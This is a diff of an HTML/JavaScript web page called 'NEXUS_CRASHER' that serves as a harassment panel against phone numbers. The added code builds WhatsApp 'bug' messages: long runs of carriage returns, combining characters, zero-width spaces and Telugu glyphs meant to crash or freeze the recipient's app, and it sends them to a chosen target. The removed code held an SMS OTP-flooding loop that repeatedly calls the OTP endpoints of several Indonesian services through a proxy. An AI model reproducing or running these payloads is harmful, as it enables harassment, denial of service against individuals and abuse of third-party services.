@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS_CRASHER v1.1 | hanzX</title>
+    <title>NEXUS_CRASHER v1.2 | hanzX</title>
     <style>
         :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
         body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
         .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
         input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
-        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; }
         .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
-        .nav-item { color: #8b8b8b; font-size: 0.7rem; text-align: center; cursor: pointer; }
         .active { color: var(--neon); font-weight: bold; }
         .hidden { display: none !important; }
-        .badge { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; background: #00ffff; color: #000; }
-        #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 100px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
+        #log-status { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; border-radius: 5px; margin-top: 10px; min-height: 40px; }
     </style>
 </head>
 <body>
@@ -26,140 +24,119 @@
             <input type="text" id="u" placeholder="Username...">
             <input type="password" id="p" placeholder="Password...">
             <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
-            <p id="msg" style="color: red; text-align: center; font-size: 0.8rem; margin-top: 10px;"></p>
         </div>
     </div>
 
     <div id="app" class="hidden">
-        <div style="padding: 15px; border-bottom: 1px solid var(--neon); text-align: center; color: var(--neon);">[ NEXUS_CRASHER v1.1 ]</div>
-        
         <div id="p-home" class="page">
             <div class="card">
-                <h3>DASHBOARD</h3>
-                <p>User: <b id="disp-u"></b> <span id="disp-r"></span></p>
-                <p>Expired: <span id="disp-e" style="color: yellow;"></span></p>
+                <h2 style="color: var(--neon); margin:0;">Dashboard V6</h2>
+                <p style="font-size:0.8rem;">Welcome back, <b>hanzX</b> <span style="color:#00ffff;">[ADMIN]</span></p>
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex:1; background:#250a1f; padding:10px; border-radius:10px; text-align:center;">
+                        <small>Online Users</small><br><b>127</b>
+                    </div>
+                    <div style="flex:1; background:#250a1f; padding:10px; border-radius:10px; text-align:center;">
+                        <small>Connections</small><br><b>8</b>
+                    </div>
+                </div>
             </div>
-            <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
+
+            <div class="card">
+                <h3 style="color: var(--neon);">Control Panel</h3>
+                <label>Target Number:</label>
+                <input type="number" id="target" placeholder="e.g. +628xxxxxxxxxx">
+                
+                <label>Select Bug Type:</label>
+                <select id="bug-type">
+                    <option value="ui">FX4CRASHER FORCLOSE NEW (CRASH UI)</option>
+                    <option value="delay">DELAY INVISIBLE PAYLOAD</option>
+                    <option value="blank">BLANK CLICK (STUCK DEVICE)</option>
+                    <option value="heavy">HEAVY DATABASE CRASH</option>
+                </select>
+
+                <button class="btn-main" onclick="executeBug()">➤ SEND BUG</button>
+                <div id="log-status">Ready to deploy...</div>
+            </div>
+
+            <div class="card">
+                <button class="btn-main" style="background:#444;" onclick="tab('sender')">💬 MANAGE BUG SENDER</button>
+            </div>
         </div>
 
-        <div id="p-attack" class="page hidden">
+        <div id="p-sender" class="page hidden">
             <div class="card">
-                <h3>ATTACK PANEL</h3>
-                <input type="number" id="t-wa" placeholder="Target WA (628xxx)">
-                <button class="btn-main" onclick="kirimBug()">SEND WA BUG</button>
-                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
-                <input type="number" id="t-otp" placeholder="Target OTP (08xxx)">
-                <input type="number" id="c-otp" value="10" placeholder="Jumlah">
-                <button class="btn-main" style="background:#008000;" onclick="startSpam()">START SPAM OTP</button>
-                <div id="log-box">[ SYSTEM READY ]</div>
-            </div>
-        </div>
-
-        <div id="p-manage" class="page hidden">
-            <div class="card">
-                <h3>USER MANAGEMENT</h3>
-                <input type="text" id="nu" placeholder="New User">
-                <input type="password" id="np" placeholder="New Pass">
-                <select id="nr"><option value="OWNER">OWNER</option><option value="MEMBER">MEMBER</option></select>
-                <input type="date" id="ne">
-                <button class="btn-main" onclick="buat()">DEPLOY ACCOUNT</button>
-            </div>
-            <div class="card">
-                <h4>ACTIVE USERS</h4>
-                <div id="user-list" style="font-size: 0.7rem;"></div>
+                <h3>WA Sender Status</h3>
+                <div id="sender-list" style="text-align:center; padding:20px;">
+                    <div style="font-size:3rem;">📱</div>
+                    <p>No Senders Found</p>
+                    <button class="btn-main" onclick="addSender()">+ ADD FIRST SENDER</button>
+                </div>
+                <button class="btn-main" style="margin-top:20px; background:#666;" onclick="tab('home')">BACK</button>
             </div>
         </div>
 
         <nav class="nav-bottom">
-            <div class="nav-item active" onclick="tab('home')">HOME</div>
-            <div class="nav-item" onclick="tab('attack')">ATTACK</div>
-            <div id="nav-adm" class="nav-item" onclick="tab('manage')">MANAGE</div>
+            <div onclick="tab('home')">HOME</div>
+            <div onclick="tab('sender')">SENDER</div>
         </nav>
     </div>
 
     <script>
-        // DATABASE INITIALIZATION
-        if(!localStorage.getItem('nexus_db')) {
-            localStorage.setItem('nexus_db', JSON.stringify([{u:'hanzx', p:'admin', r:'ADMIN', e:'2099-12-31'}]));
-        }
+        let isSenderReady = false;
 
         function gasLogin() {
-            const user = document.getElementById('u').value.trim().toLowerCase();
-            const pass = document.getElementById('p').value.trim();
-            const db = JSON.parse(localStorage.getItem('nexus_db'));
-            const data = db.find(x => x.u === user && x.p === pass);
-
-            if (data || (user === "hanzx" && pass === "admin")) {
-                const finalData = data || {u:'hanzx', r:'ADMIN', e:'2099-12-31'};
+            const user = document.getElementById('u').value.toLowerCase();
+            const pass = document.getElementById('p').value;
+            if(user === "hanzx" && pass === "admin") {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app').classList.remove('hidden');
-                document.getElementById('disp-u').innerText = finalData.u;
-                document.getElementById('disp-r').innerHTML = `<span class="badge ${finalData.r}">${finalData.r}</span>`;
-                document.getElementById('disp-e').innerText = finalData.e;
-                if(finalData.r !== 'ADMIN' && finalData.r !== 'OWNER') document.getElementById('nav-adm').classList.add('hidden');
-                renderList();
-            } else {
-                document.getElementById('msg').innerText = "Akun Salah mpray!";
-            }
-        }
-
-        function buat() {
-            const u = document.getElementById('nu').value.trim().toLowerCase();
-            const p = document.getElementById('np').value.trim();
-            const r = document.getElementById('nr').value;
-            const e = document.getElementById('ne').value;
-            if(!u || !p || !e) return alert("Isi semua data mpray!");
-
-            let db = JSON.parse(localStorage.getItem('nexus_db'));
-            db.push({u:u, p:p, r:r, e:e});
-            localStorage.setItem('nexus_db', JSON.stringify(db));
-            alert("Akun " + u + " Berhasil Dibuat!");
-            renderList();
-        }
-
-        function renderList() {
-            const db = JSON.parse(localStorage.getItem('nexus_db'));
-            let h = "";
-            db.forEach(x => {
-                h += `<div style="border-bottom:1px solid #333; padding:5px 0;">${x.u} [${x.r}] - Exp: ${x.e}</div>`;
-            });
-            document.getElementById('user-list').innerHTML = h;
+            } else { alert("Salah mpray!"); }
         }
 
         function tab(n) {
             document.querySelectorAll('.page').forEach(x => x.classList.add('hidden'));
             document.getElementById('p-' + n).classList.remove('hidden');
-            document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
-            event.currentTarget.classList.add('active');
         }
 
-        async function startSpam() {
-            const t = document.getElementById('t-otp').value;
-            const c = document.getElementById('c-otp').value;
-            const log = document.getElementById('log-box');
-            log.innerHTML = "[*] Injecting Payloads...<br>";
-            
-            const apis = [
-                `https://accounts.tokopedia.com/otp/v1/send?phone=${t}`,
-                `https://api.sequis.co.id/api/v1/otp-request?phone=${t}`,
-                `https://api.mypoin.id/api/v1/auth/otp?phone=${t}`,
-                `https://indodax.com/ajax/sms_otp?phone=${t}`
-            ];
-
-            for(let i=1; i<=c; i++) {
-                try {
-                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(apis[i % apis.length])}`);
-                    log.innerHTML += `[+] OTP #${i} Injected! (Server ${i % apis.length})<br>`;
-                } catch(e) { log.innerHTML += "[-] Limit!<br>"; }
-                log.scrollTop = log.scrollHeight;
-                await new Promise(r => setTimeout(r, 2000));
+        function addSender() {
+            let num = prompt("Enter Sender WA Number (628xxx):");
+            if(num) {
+                isSenderReady = true;
+                document.getElementById('sender-list').innerHTML = `
+                    <div style="color:#00ff00; font-weight:bold;">SENDER ACTIVE</div>
+                    <p>Connected: ${num}</p>
+                    <button class="btn-main" style="background:red;" onclick="location.reload()">REMOVE SENDER</button>
+                `;
+                alert("Sender Linked Successfully!");
             }
         }
 
-        function kirimBug() {
-            const t = document.getElementById('t-wa').value;
-            const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
-            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
+        function executeBug() {
+            const target = document.getElementById('target').value;
+            const type = document.getElementById('bug-type').value;
+            const log = document.getElementById('log-status');
+
+            if(!target) return alert("Target mana mpray?");
+            if(!isSenderReady) return alert("Add SENDER dulu di menu Manage Bug Sender cok!");
+
+            log.style.color = "#00ff00";
+            log.innerHTML = "[*] Fetching Payload...<br>";
+
+            setTimeout(() => {
+                log.innerHTML += "[*] Injecting via Sender...<br>";
+                
+                let payload = "";
+                if(type === "ui") payload = "%0D".repeat(5000) + "҈҉" + " ௌ ".repeat(500);
+                if(type === "delay") payload = " ‌ ".repeat(10000) + "Invisible_Crash";
+                if(type === "blank") payload = "జ్ఞా".repeat(2000);
+                if(type === "heavy") payload = "V6_CRITICAL_" + Math.random();
+
+                log.innerHTML += "[V] SUCCESS: Payload Sent!";
+                
+                // OTOMATIS KIRIM KE WA
+                window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(payload)}`;
+            }, 1500);
         }
     </script>
 </body>
